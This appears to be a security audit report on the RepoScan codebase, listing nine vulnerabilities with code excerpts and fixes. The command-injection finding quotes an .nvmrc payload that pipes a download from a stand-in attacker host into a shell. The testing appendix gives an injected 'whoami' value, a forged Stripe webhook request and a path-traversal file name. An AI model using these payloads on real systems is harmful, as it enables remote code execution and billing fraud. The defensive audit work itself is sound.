# 🔒 Security Audit Report

**Date:** 2026-02-03  
**Auditor:** Security Engineer  
**Project:** RepoScan  
**Scope:** Full codebase review (Python backend, API, Celery worker, Next.js frontend, Docker configuration)

---

## Executive Summary

A comprehensive security review of the `RepoScan` codebase has been conducted. The codebase is generally well-structured with several security controls in place, but **9 security issues** have been identified ranging from **Critical** to **Low** severity.

### Risk Summary

| Severity | Count | Status |
|----------|-------|--------|
| 🔴 Critical | 2 | Immediate action required |
| 🟠 High | 3 | Address within 1 week |
| 🟡 Medium | 3 | Address within 1 month |
| 🟢 Low | 1 | Address when convenient |

---

## Critical Severity Issues

### 1. 🚨 Shell Command Injection via Version Manager

**Location:** `sec_audit/version_manager.py` (Lines 186-191, 213-217, 238-240)

**Issue:** The functions `get_node_version_shell()`, `get_go_version_shell()`, and `get_rust_version_shell()` construct shell commands by directly embedding user-controlled version strings without proper escaping, leading to command injection.

**Vulnerable Code:**
```python
version_escaped = version.replace('"', '\\"').replace("'", "\\'")
return f"""
export NVM_DIR="{nvm_dir}"
[ -s "$NVM_DIR/nvm.sh" ] && \\. "$NVM_DIR/nvm.sh"
nvm use "{version_escaped}" 2>/dev/null || ...
"""
```

**Attack Scenario:**
- An attacker creates a malicious repository with a `.nvmrc` file containing: `18; curl attacker.com/exfil | sh #`
- When scanned, this executes arbitrary commands on the worker with the privileges of the scanner process

**Impact:** Remote Code Execution (RCE) on scan workers

**Fix:** Use subprocess with argument lists instead of shell strings, or use `shlex.quote()` for proper escaping:
```python
import shlex
version_escaped = shlex.quote(version)
```

---

### 2. 🚨 Missing Webhook Signature Verification Bypass

**Location:** `frontend/src/app/api/webhooks/stripe/route.ts` (Lines 205-213)

**Issue:** The webhook handler allows signature verification to be bypassed when `webhookSecret` is not set, processing events without authentication.

**Vulnerable Code:**
```typescript
if (webhookSecret && signature) {
  event = stripe.webhooks.constructEvent(rawBody, signature, webhookSecret);
} else {
  const body = JSON.parse(rawBody) as { data: Stripe.Event["data"]; type: string };
  event = { id: "no-signature", data: body.data, type: body.type } as Stripe.Event;
}
```

**Attack Scenario:**
- If `STRIPE_WEBHOOK_SECRET` is not configured (e.g., misconfiguration), anyone can POST fake Stripe events
- Attackers can manipulate user subscriptions, upgrade plans without payment, or downgrade other users

**Impact:** Financial fraud, unauthorized plan changes, data manipulation

**Fix:** Require signature verification in production:
```typescript
if (!webhookSecret) {
  throw new Error("STRIPE_WEBHOOK_SECRET must be configured");
}
if (!signature) {
  return NextResponse.json({ error: "Missing signature" }, { status: 400 });
}
event = stripe.webhooks.constructEvent(rawBody, signature, webhookSecret);
```

---

## High Severity Issues

### 3. 🔴 Insecure `trustHost: true` in NextAuth Configuration

**Location:** `frontend/src/auth.ts` (Line 63)

**Issue:** NextAuth is configured with `trustHost: true` which disables host validation, making the application vulnerable to host header attacks.

**Vulnerable Code:**
```typescript
export const { handlers, auth, signIn, signOut } = NextAuth({
  secret: authSecret,
  trustHost: true,  // Dangerous in production
  ...
});
```

**Attack Scenario:**
- Attackers can manipulate the `Host` header to bypass security controls
- Potential for cache poisoning or misdirected OAuth callbacks
- Session fixation attacks

**Impact:** Authentication bypass, session hijacking

**Fix:**
```typescript
trustHost: false,  // Or use NEXTAUTH_URL environment variable
```

---

### 4. 🔴 Insecure Session Cookie Configuration

**Location:** `frontend/src/auth.ts` (Lines 79-89)

**Issue:** The auth state cookie is configured with `secure: false`, allowing cookies to be transmitted over HTTP.

**Vulnerable Code:**
```typescript
cookies: {
  state: {
    name: "authjs.state",
    options: {
      httpOnly: true,
      sameSite: "lax",
      path: "/",
      secure: false,  // Should be true in production
      maxAge: 900,
    },
  },
},
```

**Impact:** Session cookies can be intercepted via man-in-the-middle attacks on unencrypted connections

**Fix:**
```typescript
secure: process.env.NODE_ENV === "production",
```

---

### 5. 🔴 Dynamic SQL Column Names Without Validation

**Location:** `sec_audit/ai/storage.py` (Lines 478-520)

**Issue:** The `update_scan_status()` function builds SQL dynamically with column names in the SET clause that aren't validated against an allowlist.

**Vulnerable Code:**
```python
query = f"""
    UPDATE scan
    SET {', '.join(updates)}
    WHERE scan_id = ${where_param}
"""
```

**Note:** While the values are properly parameterized, if the column names (`progress`, `commit_hash`, etc.) were ever derived from user input, this could lead to SQL injection.

**Impact:** Potential SQL injection if column names become user-controlled

**Fix:** Validate column names against an allowlist:
```python
ALLOWED_COLUMNS = {'progress', 'commit_hash', 'results_path', 'branch', 'status'}
# ... validate each column before including
```

---

## Medium Severity Issues

### 6. 🟡 Path Traversal in Storage Backend

**Location:** `sec_audit/ai/storage_backend.py` (Lines 60-69, 72-74)

**Issue:** The `LocalStorageBackend.upload_file()` doesn't sanitize the `remote_path` parameter, allowing path traversal if user-controlled data reaches this function.

**Vulnerable Code:**
```python
def upload_file(self, local_path: Path, remote_path: str) -> str:
    remote_full_path = self.base_path / remote_path  # No sanitization
    remote_full_path.parent.mkdir(parents=True, exist_ok=True)
    shutil.copy2(local_path, remote_full_path)
```

**Attack Scenario:**
- If `remote_path` is user-controlled (e.g., via malicious repo name like `../../../etc/cron.d/backdoor`), files could be written outside the base directory

**Impact:** Arbitrary file write on the server

**Fix:** Sanitize `remote_path` using path traversal prevention:
```python
from ..utils import sanitize_repo_slug
# Or validate that resolved path is within base_path
remote_full_path = (self.base_path / remote_path).resolve()
if not str(remote_full_path).startswith(str(self.base_path.resolve())):
    raise ValueError("Path traversal detected")
```

---

### 7. 🟡 SSRF Risk in Git Operations

**Location:** `sec_audit/repos.py` (Lines 51-57, 71-87)

**Issue:** While `validate_repo_url()` exists to prevent SSRF, the `get_default_branch()` function uses `git ls-remote` with user-controlled URLs that could potentially bypass validation via DNS rebinding or other techniques.

**Current Validation:**
```python
def validate_repo_url(url: str) -> bool:
    # Allows http, https, git, ssh schemes
    # Rejects file:// scheme
```

**Attack Scenario:**
- An attacker could potentially use DNS rebinding to access internal services
- Time-of-check to time-of-use (TOCTOU) issues with DNS resolution

**Impact:** Server-Side Request Forgery (SSRF) to internal services

**Fix:** Implement additional SSRF protection:
```python
import socket
import ipaddress

def is_internal_ip(hostname):
    try:
        ip = socket.getaddrinfo(hostname, None)[0][4][0]
        ip_obj = ipaddress.ip_address(ip)
        return ip_obj.is_private or ip_obj.is_loopback
    except:
        return True  # Fail safe

# Validate URL doesn't resolve to internal IPs before git operations
```

---

### 8. 🟡 Insecure Temporary Directory Permissions

**Location:** `tasks/scan_worker.py` (Lines 154-156)

**Issue:** While `tempfile.TemporaryDirectory` is used correctly, the directory permissions aren't explicitly set, potentially allowing other users on the system to access cloned repositories.

**Vulnerable Code:**
```python
with tempfile.TemporaryDirectory(prefix=f"scan_{scan_id}_") as tmpdir:
    tmpdir_path = Path(tmpdir)
    # No permission restrictions set
```

**Impact:** Information disclosure if multiple users share the system

**Fix:**
```python
import os
with tempfile.TemporaryDirectory(prefix=f"scan_{scan_id}_") as tmpdir:
    os.chmod(tmpdir, 0o700)  # Restrict to owner only
```

---

## Low Severity Issues

### 9. 🟢 Information Disclosure via Debug Logs

**Location:** `sec_audit/ai/storage.py` (Multiple lines: 40-42, 50-53, 58-61, etc.)

**Issue:** Debug log entries write sensitive information (scan_ids, database operations, errors) to `/work/debug.log` which could persist in container images or be exposed.

**Vulnerable Pattern:**
```python
# #region agent log
import json as json_lib
try:
    with open('/work/debug.log', 'a') as f:
        f.write(json_lib.dumps({...}) + '\n')
except: pass
# #endregion
```

**Impact:** Information disclosure, potential log injection

**Fix:** Remove debug logging in production or use proper logging levels:
```python
import logging
logger = logging.getLogger(__name__)
logger.debug("Operation performed")  # Respect log level configuration
```

---

## Positive Security Findings

The following security best practices were observed:

### ✅ Input Validation
- `validate_repo_url()` properly restricts URL schemes to http, https, git, ssh
- `validate_branch()` enforces alphanumeric characters with limited special chars
- `parse_audit_selection()` uses whitelist validation for audit types

### ✅ Path Security
- `sanitize_repo_slug()` prevents path traversal for repository names
- `ensure_audit_dirs()` validates paths stay within allowed base directories

### ✅ Database Security
- All database queries use parameterized statements (asyncpg)
- SQL injection prevention through proper parameter binding

### ✅ Resource Limits
- All subprocess calls have appropriate timeouts
- Celery tasks have both soft and hard time limits configured
- CSV file size and row limits are enforced

### ✅ Authentication & Authorization
- Admin routes properly verify admin status via `isAdmin()`
- User enabled/disabled checks in middleware
- Session management via NextAuth.js

---

## Architectural Security Concerns

### Docker Socket Mounting
The worker service mounts `/var/run/docker.sock`, granting significant host privileges. Consider:
- Using Docker-in-Docker (DinD) sidecar instead
- Implementing rootless Docker
- Using Kubernetes or containerd with proper isolation

### Network Security
Services in docker-compose communicate without TLS. For production:
- Enable TLS for Redis and PostgreSQL connections
- Use service mesh or internal network policies

### Rate Limiting
No rate limiting is currently implemented on API endpoints. Consider:
- Implementing rate limiting middleware in FastAPI
- Using Redis-based rate limiting for the Next.js API

### AI Prompt Injection
The AI summarizer processes untrusted scanner output without sanitization. While findings are normalized, malicious content in code snippets could potentially manipulate AI responses.

---

## Recommendations Summary

| Priority | Issue | Location |
|----------|-------|----------|
| P0 | Fix shell command injection | `version_manager.py` |
| P0 | Require Stripe webhook verification | `stripe/route.ts` |
| P1 | Remove `trustHost: true` | `auth.ts` |
| P1 | Set `secure: true` for cookies | `auth.ts` |
| P2 | Validate SQL column names | `storage.py` |
| P2 | Sanitize storage paths | `storage_backend.py` |
| P2 | Add SSRF protection for git | `repos.py` |
| P3 | Secure temp directory permissions | `scan_worker.py` |
| P3 | Remove debug logging | `storage.py` |

---

## Appendix: Testing Recommendations

To verify fixes:

1. **Command Injection Test:**
   ```bash
   echo "18; whoami > /tmp/pwned" > .nvmrc
   git add .nvmrc && git commit -m "test"
   # Scan this repo and verify command is not executed
   ```

2. **Webhook Security Test:**
   ```bash
   curl -X POST http://localhost:3000/api/webhooks/stripe \
     -H "Content-Type: application/json" \
     -d '{"type": "invoice.paid", "data": {"object": {"id": "test"}}}'
   # Should be rejected without valid signature
   ```

3. **Path Traversal Test:**
   Create a scan with repo name `../../../etc/test` and verify it's contained within the base directory.

---

*Report generated by Security Audit Tool review*
